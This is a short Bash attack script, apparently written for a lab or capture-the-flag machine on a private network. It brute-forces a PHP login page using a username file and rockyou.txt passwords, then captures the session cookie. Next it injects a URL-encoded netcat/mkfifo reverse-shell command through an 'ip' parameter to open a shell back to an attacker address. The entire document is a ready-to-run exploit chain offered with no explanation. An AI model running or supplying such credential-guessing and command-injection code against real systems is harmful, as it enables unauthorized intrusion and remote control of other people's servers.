#!/bin/bash

usuario_valido=""
contrasenia_valida=""

for user in $(cat usuarios); do

	for password in $(cat /usr/share/wordlists/rockyou.txt | head -n 8000); do
		state=$(curl -s -v -X POST "http://192.168.146.139/login.php" -d "username=$user" -d "password=$password" 2>&1 | grep "location" | awk '{print $3}')
		if [ $state != "index.php"  ]; then
			echo "[+] Credenciales encontradas!"
			echo -e "\tUsuario: $user"
			echo -e "\tPassword: $password"
			usuario_valido=$user
			contrasenia_valida=$password
			break 2
		fi
	done
done

php_cookie=$(curl -s -v -X POST "http://192.168.146.139/login.php" -d "username=$usuario_valido" -d "password=$contrasenia_valida" 2>&1 | grep "PHPSESSID" | tr '=' ' ' | awk '{print $4}' | tr -d ';')

cmd="rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.128 443 >/tmp/f"

rce=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$cmd\"))")

#echo $rce

curl -s -X GET "http://192.168.146.139/profile.php?ip=192.168.146.128;$rce" -H "PHPSESSID=$php_cookie" | html2text

